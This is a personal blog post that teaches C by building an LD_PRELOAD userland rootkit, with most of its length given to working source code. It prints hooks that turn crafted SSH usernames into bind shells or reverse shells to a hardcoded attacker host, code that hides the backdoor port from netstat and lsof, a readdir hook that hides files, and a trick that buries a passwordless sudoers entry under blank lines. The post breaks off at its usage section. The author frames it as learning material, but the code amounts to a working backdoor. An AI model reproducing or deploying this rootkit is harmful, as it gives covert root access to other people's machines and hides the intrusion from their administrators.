---
layout: single
title: Creating a Rootkit to Learn C
date: 2019-9-29
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - Linux
  - Socket Programming
  - C
  - Rootkits
  - LD_PRELOAD
  - Jynx Rootkit
--- 

## Background Information
This post is my solution for the last assignment in my [Learning-C](https://github.com/h0mbre/Learning-C) repository. I thought a good way to cap off a repo designed to introduce people to very basic C programming would be to take those very basic techinques and make a simple yet powerful security related program, namely a malicious shared library rootkit.

I came across LD_PRELOAD rootkits while watching [a talk by @r00tkillah](https://www.youtube.com/watch?v=wyRRbow4-bc&feature=youtu.be) in 2016 about his initrd rootkit. He talks about historical approaches to Linux rootkits and the LD_PRELOAD approach gets some good coverage. Since it was described in the talk as a userland approach, I started reading about them and quickly discovered a few well-known implementations, namely the [Jynx Rootkit](https://github.com/chokepoint/Jynx2). Jynx has a lot of articles discussing its features and how to detect it. It was fairly robust, checking in at around 1,500 lines of code in the main file and hooking ~20 syscalls. 

My goal for this assignment since we had just learned how to hook syscalls in the previous assignment, was to create a userland rootkit which:
- provided a backdoor/command-shell opportunity,
- hid malicious network connections from `netstat` (and maybe `lsof`), and
- hid malicious files. 

**To be clear:** I'm fully aware this isn't a robust, red-team-ready rootkit ready to use for engagements. These techniques have been analyzed and discussed for around 7 years now. **BUT** it is sort of a niche subject and something I don't think many people have come across. I would also like to just point people towards blogs and posts that detail the technical details at play here instead of expounding on those details myself, as I am not an expert. 

All of this is possible with very simple C. (hacky, bad C at that!)

***Do not use these techinques for malicious purposes. The technical explanation of the code and techniques below are simply my understanding of how they work. It is entirely possible I have completely misinterpreted how these programs behave and running them on your system could cause damage.***

## Shared Libraries and LD_PRELOAD

A lot has been written on the topic of Shared Libraries so I won't spend much time here explaining them (we even touched on them in the last post). Shared or dynamic libraries define functions that the dynamic linker links to other programs during their run time. A common example is [libc](http://man7.org/linux/man-pages/man7/libc.7.html). This reduces the amount of code you need in a program executable because it shares function definitions with a library. 

`LD_PRELOAD` is a configurable environment variable that allows users to specify a shared library to be loaded into memory for programs before other shared libraries. Just a quick example, if we check the shared libraries used by `/bin/ls` on a standard x86 Kali box, we get:
```
tokyo:~/ # ldd /bin/ls                                             
	linux-gate.so.1 (0xb7fcf000)
	libselinux.so.1 => /lib/i386-linux-gnu/libselinux.so.1 (0xb7f57000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7d79000)
	libpcre.so.3 => /lib/i386-linux-gnu/libpcre.so.3 (0xb7d00000)
	libdl.so.2 => /lib/i386-linux-gnu/libdl.so.2 (0xb7cfa000)
	/lib/ld-linux.so.2 (0xb7fd1000)
	libpthread.so.0 => /lib/i386-linux-gnu/libpthread.so.0 (0xb7cd9000)
```

So we see a number of shared library dependencies for `/bin/ls`. If we set the environment variable for `LD_PRELOAD` to a notional shared library we can actually change what shared library dependencies that binary has. Furthermore, `LD_PRELOAD` allows us to specify that our chosen library is loaded into memory **before all others**. We can create a shared library called `example.so` and export it `LD_PRELOAD` as follows, and then check the library dependencies of `/bin/ls`: 
```
tokyo:~/LearningC/ # export LD_PRELOAD=$PWD/example.so                                                                     
tokyo:~/LearningC/ # ldd /bin/ls                                                                                            
	linux-gate.so.1 (0xb7fc0000)
	/root/LearningC/example.so (0xb7f8f000)
	libselinux.so.1 => /lib/i386-linux-gnu/libselinux.so.1 (0xb7f43000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7d65000)
	libdl.so.2 => /lib/i386-linux-gnu/libdl.so.2 (0xb7d5f000)
	libpcre.so.3 => /lib/i386-linux-gnu/libpcre.so.3 (0xb7ce6000)
	/lib/ld-linux.so.2 (0xb7fc2000)
	libpthread.so.0 => /lib/i386-linux-gnu/libpthread.so.0 (0xb7cc5000)
```

As you can see, our library at `/root/LearningC/example.so` is loaded first before any other library on disk. ([Awesome explanation](https://www.technovelty.org/linux/a-little-tour-of-linux-gateso.html) of that first library, "`linux-gate.so.1`")

It should be noted that by not specifying a binary after the path to our shared library, `LD_PRELOAD` will use the specified shared library for all dynamically linked programs system wide. 

## /etc/ld.so.preload
As a way to avoid setting environment variables, we are also allowed to create a text file called `/etc/ld.so.preload` and shared libraries stored in this file delimited by a white space will be `LD_PRELOAD`'d in a sense in the order that they're written, again, system-wide. There is no way to specify a binary this way, this will apply to all dynamically linked programs. We can see that dynamically linked programs check for this file's existence when they are called upon by using the `strace` utility to spy on what system calls a program makes when run. Let's again try `/bin/ls`:
```
tokyo:~/LearningC/ # strace /bin/ls                                                                                        
execve("/bin/ls", ["/bin/ls"], 0xbf8d8e60 /* 47 vars */) = 0
brk(NULL)                               = 0xbc1000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ed6000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
-----snip-----
```

As you can see, `/bin/ls` calls the `access()` syscall, and checks to see if it has access to `/etc/ld.so.preload`; however, the return value is a `-1` indicating that the file does not exist (`No such file or directory`). 

Let's create the file and then run this excercise again:
```
tokyo:~/LearningC/ # echo "" > /etc/ld.so.preload                                                                           
tokyo:~/LearningC/ # strace /bin/ls                                                                                        
execve("/bin/ls", ["/bin/ls"], 0xbfcba0a0 /* 47 vars */) = 0
brk(NULL)                               = 0x570000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eff000
access("/etc/ld.so.preload", R_OK)      = 0
openat(AT_FDCWD, "/etc/ld.so.preload", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
-----snip-----
```

This time, we actually get an `openat()` syscall right after `access()` because access finishes with a return value of `0` indicating success. `openat()` returns a value of `3` as a file descriptor.

Let's input our malicious `example.so` library in `/etc/ld.so.preload` and see what `strace` has to say about it. 
```
tokyo:~/LearningC/ # strace /bin/ls                                                                                        
execve("/bin/ls", ["/bin/ls"], 0xbf956640 /* 47 vars */) = 0
brk(NULL)                               = 0x1a8f000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f64000
access("/etc/ld.so.preload", R_OK)      = 0
openat(AT_FDCWD, "/etc/ld.so.preload", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=27, ...}) = 0
mmap2(NULL, 27, PROT_READ|PROT_WRITE, MAP_PRIVATE, 3, 0) = 0xb7f92000
close(3)                                = 0
openat(AT_FDCWD, "/root/LearningC/example.so", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\21\0\0004\0\0\0"..., 512) = 512
```

We see that not only did it open `/etc/ld.so.preload`, it read some values from the file and then opened our shared library for reading. We were able to get our shared library loaded into memory for the run time of `/bin/ls`. 

## Hooking Syscalls with Shared Library Injections
As we have discussed in the `Learning C` progression, this preloading mechanism allows a `root` user to powerfully manipulate userland programs. We can effectively redefine common, frequently-used syscall functions and their higher-level abstraction wrapper functions to mean whatever we arbitrarily desire. If you need more information on this portion of our experiment please consult [Assignment-27](https://github.com/h0mbre/Learning-C/tree/master/Assignment-27) of our `Learning C` repo where we go over a lot of the information discussed so far. [In a previous example], we hooked `puts()` by using an example found in [this blog post](https://blog.netspi.com/function-hooking-part-i-hooking-shared-library-function-calls-in-linux/) to check its buffer for a string and if found, print a different message to the terminal. 

## The Noob Rootkit "Manteau"
To meet my aforementioned rootkit goals I didn't have to hook many syscalls. I ended up hooking `write()`, `readdir()`, `readdir64()`, `fopen()`, and `fopen64()`. If you discount the `64` variations for large file considerations, basically just 3 syscalls. With these 3 syscalls, we can hide from `netstat`, `lsof`, `ls`, and also spawn some plaintext connections to our attacker machine. "Manteau" means cloak in French, let's make this as corny as possible. 

## Hooking `write()` For a Trigger!
Hooking `write()` was surprisingly simple for our purposes. I wanted to create a cool way to activate/trigger our rootkit from an external host. There have been some really cool ways to do this developed over the years but I tried to be somewhat low-tech and original. [The Jynx rootkit](https://github.com/chokepoint/Jynx2/blob/master/jynx2.c) I have discussed previously in the repo, hooked the `accept()` syscall (which we will be using a lot in this post) to check local and source port information of the connection as a way to check if the connection came from the attacker. These values were hardcoded in their malicious library and could be set at compile time. It then would prompt for a password and spawn an encrypted back connect over `openssl`. We won't be doing anything that badass, but we will be doing something cool. 

### Making Syslog Evil
Initially, when contemplating ways to make a remote host do work after touching it in someway, I landed on the Apache `access.log`. What I thought I would do is, I would send a simple `GET HTTP` request with a magic string in the `User Agent:` field, and when the Apache process wrote that information to disk in the `access.log`, our hook would check the `write()` buffer for our magic string and if found, spawn a connection to our host. 

This actually worked, and it worked really well! However, there was a small problem. It actually required me restarting Apache after specifying our malicious library in `/etc/ld.so.preload` so that was aesthetically displeasing to me. I didn't like the fact that you'd have to restart a webservice for your rootkit, not saying our shared library is super stealth, but knocking over a webserver is kind of high-visibility. 

Along those same lines, I discovered that the `syslog` user writes failed SSH attempts to `auth.log`. It logs the user's username and IP address. Example entry: `Failed password for nobody from 91.205.189.15 port 38556 ssh2`. Awesome, we control the username field (`nobody` in the example) in a log on the system. The same problem applies, we must restart syslog after loading our shared library, but this isn't as high visibility as say, restarting Apache. (Linux sysadmins let me know if I'm wrong about that). 

A second problem we face is that we don't want to come back to this box as `syslog`, we want to come back as `root`. There are probably a million ways to leave yourself privesc breadcrumbs, especially given that you can hide arbitrary files, but I chose to just `visudo` the `sudoers` file and add `syslog`. I also inserted about 80 newlines after the last bit of visible text in the file before adding the `syslog ALL=(ALL) NOPASSWD:ALL` entry so that the casual `sudoers` file editor hopefully wouldn't notice. (LOL)

Alright, so we have a trigger idea and a built in privesc. Let's write some C finally!

### Write Hook
The `write()` hook I created is a lot like the `puts()` hi-jack we already studied surprisingly. The first portion looks like this: 
```c
ssize_t write(int fildes, const void *buf, size_t nbytes)
{
    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);

    ssize_t result;

    new_write = dlsym(RTLD_NEXT, "write");


    char *bind4 = strstr(buf, KEY_4);
    char *bind6 = strstr(buf, KEY_6);
    char *rev4 = strstr(buf, KEY_R_4);
    char *rev6 = strstr(buf, KEY_R_6);
 ```
 
 Let's break this down:
 + `ssize_t write(int fildes, const void *buf, size_t nbytes)` this is the man page declaration of the `write()` function. This has to match perfectly or the calling process won't use our shared library as a resource, it will continue to look for `write()` definition elsewhere. Now that we have the calling process' attention;
 + `ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);` we declare a second function with the same structure as the genuine `write()` function. This one is actually declaring a pointer but it is not yet initialized (it doesn't yet point to anything). `(*new_write)` says "this is a pointer to a function called `new_write()`" and then the rest of the declaration provides a definition for the function that will eventually be pointed to;
 + `new_write = dlsym(RTLD_NEXT, "write");` does something very crucial. We had already declared a pointer to `new_write()` but we hadn't yet initialized it. *Now* we are initializing it and giving it a memory address to point to. It is now going to point to the address returned by `dlsym` [https://linux.die.net/man/3/dlsym]. `dlsym` is a way to interface with the dynamic linker and we give it two arguments. We ask it to find the next occurence (`RTLD_NEXT`) in the subsequent linked libraries of the call `"write"`. `dlsym` returns the address of next occurence found of that `"write"` symbol. What would that be? Well, it's going to be the address of the **REAL** `write()` function, because it's going to consult the legitimate libraries after ours. So now, `new_write` is essentially just a reference to the actual real `write()` syscall as intended;
 + `ssize_t result;` we declare a variable of type `ssize_t` the data type returned by our `write()` function and call it `result`. 
 + The last four lines are very similar, `char *bind4 = strstr(buf, KEY_4);` delcares and initializes a new pointer variable of the `char` type that is equal to the result of the `strstr()` function after comparing the buffer being written (a reference to the `const void *buf` argument in our `write()` syscall) to a harcoded defined variable `KEY_4`. You can set `KEY_4` to whatever you like, I set it to `#define KEY_4 "notavaliduser4"`. `strstr()` is very interesting. If it finds the second argument within the first argument, it will return a pointer to the first occurence of the second argument. So if it returns a `NULL` we know that it didn't find a match. 
 
 Let's look at the next block of code:
 ```c
 if (bind4 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_bind();
    }

    else if (bind6 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv6_bind();
    }

    else if (rev4 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_rev();
    }

    else if (rev6 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv6_rev();
    }
    
    return result;
}
 ```
 Although long, there's not a lot to get through here. We've basically used `if/else if` to check the buffer being written for mulitple sub-strings that we're using as our trigger. Let's break it down:
 + `if (bind4 != NULL)` we check to see if the variable `bind4` is `NULL` and if it's not, we jump to our logic;
 + `fildes = open("/dev/null", O_WRONLY | O_APPEND);` if it's not `NULL`, then we have a match, we know we're trying to activate the rootkit because we sent our magic string `notavaliduser4` as an SSH attempt. Of course that will fail, so `syslog` will log that and activate our hooked `write()` syscall. Since we have a match, we don't actually want it written to log that we tried to do fishy stuff. So let's re-route the `write()` operation by first using `open()` to open `/dev/null` in an append and write mode and then passing that return value to the `int filedes` variable we had already used in our function declaration. It should be mentioned that routing to `/dev/null` is just one solution, you could also just not `write()` at all. You are God here (well, userland God anyway);
 + `result = new_write(fildes, buf, nbytes);` we now do a normal write operation on `/dev/null` and give the return value to our `ssize_t result` variable we defined in our function declaration. This `result` variable can now be delivered to follow on functions. `syslog` calls something like `open()` to open `auth.log` it then calls `write()` because it has a buffer it needs to put in the file (our failed SSH attempt) and then the write operation returns a result in the form of our variable `result` which is probably just an indication of completion or failure. To the process, nothing here is broken, it called write, and got a result as intended. Know that when `syslog` called `write()` here, it had values it used as arguments in place of the function declaration arugments. It didn't pass `const void *buf` to `write()` when it called it for example, it passed it something like a pointer to a string that said "failed SSH attempt for...";
 + `ipv4_bind()` is the name of a function that is being called which binds a command shell to a listening port. That function is defined above in the program. We will show what that is later, but essentially it's just our IPV4 TCP bind shell that we wrote in a previous assignment on port 65065. 
 
 So, our trigger hit the write buffer, was written to `/dev/null` instead of `/var/log/auth.log`, a function opening a bind shell was called, and then finally we need to return the result to the calling process so it knows whether or not the `write()` function worked. We accomplish that with the last bit of code `return result;`. 
 
 We have quite a few possiblities here. All in all, there are 4 distinct triggers for an IPv4 bindshell, IPv6 bindshell, IPv4 reverse-shell, and IPv6 reverse-shell. Let's dig into those a bit. We won't recapitulate the entire piece of code in each since we've already completed [a bind shell](https://github.com/h0mbre/Learning-C/tree/master/Assignment-26), but we'll focus on the new aspects. Here is each function: 
 
### `ipv4_bind()` Bind Shell

 ```c
 int ipv4_bind (void)
{
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(LOC_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    const static int optval = 1;

    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    listen(sockfd, 0);

    int new_sockfd = accept(sockfd, NULL, NULL);

    for (int count = 0; count < 3; count++)
    {
        dup2(new_sockfd, count);
    }

    char input[30];

    read(new_sockfd, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    if (strcmp(input, PASS) == 0)
    {
        execve("/bin/sh", NULL, NULL);
        close(sockfd);
    }
    else 
    {
        shutdown(new_sockfd, SHUT_RDWR);
        close(sockfd);
    }
    
}
```

 The new code that wasn't present in our last implementation of a bind shell, really starts in earnest with `read(new_sockfd, input, sizeof(input));`. You can see that a little earlier in the program we had declared a `char input[30]` variable. What we're doing here is executing a `read()` syscall and passing it the file descriptor returned by our `accept()` command. So when someone makes a connection to our bind shell, we are reading their input. 
 
 We use the `strcspn()` function, which returns the number of characters in the first argument string that exist before we reach the 2nd argument. So since the user would enter a password and then hit return, they would send something like `"reallygoodpassword\n"` as our `input`. `input[strcspn(input, "\n")] = 0;` says the value of the last index of the `input` variable is `0`, effectively null terminating our string for us by replacing the newline character with a null terminator. Let's test out our theory here with this simple code where read input from `stdin` and store it in `input`:
 ```c
 int main (void)
{
    char input[30];
    read(0, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    printf("The input was %s", input);
}
```

Let's compile and run this:
```
tokyo:~/LearningC/ # gcc test.c -o test
tokyo:~/LearningC/ # ./test                                                                                                
password
The input was password#
```

So this is what we use to compare the user's input to our hardcoded password defined by `PASS` with the `strcmp()` function. 

If `strcmp()` returns a `0`, indicating the arguments matched, the program issues an `execve()` call and pushes to the `/bin/sh` program to the connection giving the end user a command shell. 

If `strcmp()` returns a value other than `0`, indicating there was not a match between the arguments, the socket associated with the `accept()` syscall is shutdown, and the listening socket is closed. 

The `ipv6_rev()` function works very similarly except it has been programmed to deal strictly with IPv6 traffic. 

### `ipv4_rev()` Reverse Shell
Below is the code block defining our IPv4 reverse shell function:
```c
int ipv4_rev (void)
{
    const char* host = REM_HOST4;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REM_PORT);
    inet_aton(host, &addr.sin_addr);

    struct sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_port = htons(LOC_PORT);
    client.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    bind(sockfd, (struct sockaddr*) &client, sizeof(client));

    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    for (int count = 0; count < 3; count++)
    {
        dup2(sockfd, count);
    }

    execve("/bin/sh", NULL, NULL);
    close(sockfd);

    return 0;
}
```

The `ipv4_rev()` function works very similarly to the bind shell we just explained; however, the remote host address and port have been hardcoded and defined by the `REM_HOST4` and `REM_PORT` definitions respectively. 

One other aspect of the reverse shell, is that we issue a `bind()` syscall with the following line: `bind(sockfd, (struct sockaddr*) &client, sizeof(client));`. `client` in this case is a reference to our `client` struct of type `sockaddr` which describes the victim host (the client in a reverse shell paradigm). This line of code helps us ensure that the outgoing reverse shell connection is coming from a specific source port (`LOC_PORT` or `65065`) on the victim which will come in handy later when we are hiding connections from `/bin/netstat` based on a port number. 

The IPv6 reverse shell function works very similarly. 

### Wrapping Up Our `write()` Hook

We have hooked all `write()` calls system wide and have isolated `syslog` writing to the `/var/log/auth.log` file to log failed SSH attempts. We use a trigger word as our username, which tells the hooked command to either spawn a bind or reverse shell over either IPv4 or IPv6. We have a lot of options for our backdoor now. 

## Hiding From `netstat` (and `lsof` ??)
Now that we have a functioning backdoor, it's time to hide those connections from `netstat`. We've picked a high port for our shell functions so that the host is always using local port `65065` for our connections. This is a pretty random port to use so we will avoid a lot of false positives hopefully. 

To understand how to hide from these utilities, we first have to understand what syscalls they're making when they're run. Let's open up a listener on `65065` and run `netstat` with `strace` to see what's going on under the hood:

```
tokyo:~/LearningC/ # strace netstat -ano | grep -v unix                                                                     
execve("/usr/bin/netstat", ["netstat", "-ano"], 0xbfd0de64 /* 47 vars */) = 0
-----snip-----
openat(AT_FDCWD, "/proc/net/tcp", O_RDONLY|O_LARGEFILE) = 3
read(3, "  sl  local_address rem_address "..., 4096) = 450
read(3, "", 4096)                       = 0
close(3)                                = 0
-----snip-----
write(1, "Active Internet connections (ser"..., 4096Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:65065           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::65065                :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
udp        0      0 0.0.0.0:68              0.0.0.0:*                           off (0.00/0/0)
raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
```

So the first thing we're seeing is that we use `execve()` to call it, we then see it opening `/proc/net/tcp` in read only mode and reading `450` bytes from the file and then closing. Later, it then writes all of that data to `stdout`. Pretty straight forward stuff. 

Let's pop open `/proc/net/tcp` for ourselves and see what's there:

```
tokyo:~/LearningC/ # cat /proc/net/tcp                                                                                      
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:FE29 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 107639 1 c563dbf8 100 0 0 10 0                            
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 73178 1 cb66d650 100 0 0 10 0               
```

So we see the same information that was printed to the terminal in hex representation. `FE29` is `65065` in hex and since we're listening on the local `0.0.0.0` interface, it's prepended by `00000000`. There is no remote address information because we're not connected. 

So `netstat` reads this file and then stores that in a read buffer which is then interpreted and written to the terminal. 

We need a way to intercept a portion of this process and alter the results so that the `FE29` entries are not passed back to the end user of `netstat`. To accomplish this, I created an `fopen()` hook which is a higher-level wrapper function and not quite a syscall like `open()`. `netstat` actually calls `fopen()` which in turn calls lower level functions and syscalls. Here is the entire hook, and we will explain the whole thing: 
```c
FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
	orig_fopen = dlsym(RTLD_NEXT, "fopen");

	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

	FILE *fp;

	if (ptr_tcp != NULL)
	{
		char line[256];
		FILE *temp = tmpfile();
		fp = orig_fopen(pathname, mode);
		while (fgets(line, sizeof(line), fp))
		{
			char *listener = strstr(line, KEY_PORT);
			if (listener != NULL)
			{
				continue;
			}
			else
			{
				fputs(line, temp);
			}
		}
		return temp;

	}

	fp = orig_fopen(pathname, mode);
	return fp;
}
```

Let's explain this line by line:
+ `FILE *(*orig_fopen)(const char *pathname, const char *mode);` we are declaring a pointer to the function `orig_fopen` which has the exact definition of the legitimate `fopen()` function. This will later become our reference to the real function;
+ `FILE *fopen(const char *pathname, const char *mode)` this is our hook, this is what the calling program sees and recognizes as the offical definition of `fopen()`;
+ `orig_fopen = dlsym(RTLD_NEXT, "fopen");` we are initializing the pointer we declared earlier. We now have the address of the real `fopen()` function so that we can pass execution to it when needed;
+ `char *ptr_tcp = strstr(pathname, "/proc/net/tcp");` we are declaring a pointer that will be initialized if the `pathname` passed as an argument to `fopen()` by the calling program has a substring match with `"/proc/net/tcp"`; 
+ `FILE *fp;` we are using the `FILE` keyword to declare a pointer named `fp` that is of the `FILE` structure type. This will be normally the type of returned variable type of an `fopen()` function call so we need to initialize this with a `fopen()` call later;
+ `if (ptr_tcp != NULL)` if there's a match, and the file being opened is our `/proc/net/tcp`, do something;
+ `char line[256];` we are declaring a character array of 255 bytes and a null terminator;
+ `FILE *temp = tmpfile();` we are declaring AND initializing another `FILE` pointer, this one named `temp`, which points to a temporary file that lives in `/tmp` as long as `netstat` is running;
+ `fp = orig_fopen(pathname, mode);` we've now finally initialized the `fp` `FILE` pointer and we have a pointer to the `/proc/net/tcp` file that's been opened;
+ `while (fgets(line, sizeof(line), fp))` we are using `fgets()` to grab a line of the `fp` (`/proc/net/tcp`) file at a time. As long as there are lines to grab (`while True`), do something;
+ `char *listener = strstr(line, KEY_PORT);` we are declaring a pointer named `listener` that will be initialized if there is a substring match between the line we just collected from `/proc/net/tcp` and `KEY_PORT` which we have defined as `FE29` (the hex representation of `65065`);
+ Next, we have an `if` statement `if (listener != NULL)` so that if `listener` isn't `NULL`, we `continue` meaning, we won't actually do anything with that line, leave that line in the ether;
+ BUT, if the pointer isn't `NULL`, we `fputs(line, temp);` which means that we place that line in our temporary file;
+ `return temp;` here we just return `temp`, which is the result of our `fopen()` function to our temporary file, back to the end-user for futher processing;
+ finally, if `/proc/net/tcp` is NOT being opened, we simply pass execution to the real `fopen()` with `fp = orig_fopen(pathname, mode);` and `return fp;`. 

Phew, that was quite a bit. I was quite proud of this one, there is definitely a memory leak in here somewhere but it works! When the user calls `netstat` its going to open `/proc/net/tcp` our hook will then create a temporary file and copy everything BUT our malicious connection into the temporary file and then present that temporary file to the end user. As a bonus, that file only lives on disk in `/tmp` for as long as `netstat` runs, which is not very long. That owns. 

This hook also destroys `lsof` ability to check the port as well. I'm not quite sure how this is accomplished yet, but we've effectively hidden from two powerful utilities with our simple C. 

## Hiding from `/bin/ls`
After consulting some resources, namely [this explanation of ls here](https://gist.github.com/amitsaha/8169242), I knew I had to hook the `readdir()` function which again is a higher-level wrapper which calls `getdents()`. We can see this in the `strace` output: 
```
tokyo:~/LearningC/ # strace /bin/ls                                                                                                     execve("/bin/ls", ["/bin/ls"], 0xbfbf4890 /* 47 vars */) = 0
-----snip-----
getdents64(3, /* 34 entries */, 32768)  = 1064
getdents64(3, /* 0 entries */, 32768)   = 0
close(3)  
```

We see that `getdents()` getting the directory entries for the `3` file descriptor and brings back `34` entries with a size of `1064`. So we have to figure out how `readdir()` works. 

The [manpage](http://man7.org/linux/man-pages/man3/readdir.3.html) defines the function: `struct dirent *readdir(DIR *dirp);`. 

So it returns a pointer to the next `dirent` structure in the directory. Here is the definition in `glibc` of the `dirent` struct:
```
struct dirent {
               ino_t          d_ino;       /* Inode number */
               off_t          d_off;       /* Not an offset; see below */
               unsigned short d_reclen;    /* Length of this record */
               unsigned char  d_type;      /* Type of file; not supported
                                              by all filesystem types */
               char           d_name[256]; /* Null-terminated filename */
           }
```

The only member that is mandatory in the structure is the `d_name` which is the null-terminated filename of the entry. That seems pretty easy actually. We can actually key in on this fact, that `d_name` is mandatory, and compare its value for entries to a string, such as `rootkit.txt` and somehow manipulate the function to skip our entries. Let's actually do that! Here is our hook for `readdir()`:
```c
struct dirent *(*old_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp)
{
    old_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir;

    while (dir = old_readdir(dirp))
    {
        if(strstr(dir->d_name,FILENAME) == 0) break;
    }
    return dir;
}
```

I got this hook from basically just following the walkthrough on this blog: https://ketansingh.net/overview-on-linux-userland-rootkits/

We can go through it piece by piece:
+ `struct dirent *(*old_readdir)(DIR *dir);` same thing as our hook for `fopen()`, we're declaring a function that will later be initialized to point towards the address of the real `readdir()`;
+ `struct dirent *readdir(DIR *dirp)` we are declaring a function which perfectly matches the definition of the legitimate `readdir()` function;
+ `old_readdir = dlsym(RTLD_NEXT, "readdir");` we are initializing the function we declared so that it points to the real `readdir()`;
+ `while (dir = old_readdir(dirp))` we are saying, while it is true that the legitimate `readdir()` is still iterating through directory entries and returning a value, do something;
+ `if(strstr(dir->d_name,FILENAME) == 0) break;` we are comparing `FILENAME`, which is a definiton, to the `d_name` member of the `dir` struct returned by our `old_readdir()` and if a match is found (that is, a `0` is returned), we are `breaking` on that entry and skipping over it;
+ finally, we `return dir` to complete the function's called purpose. 

With this setup, we can hide arbitrary files from `/bin/ls`. 

## Actually Using the Damn Rootkit



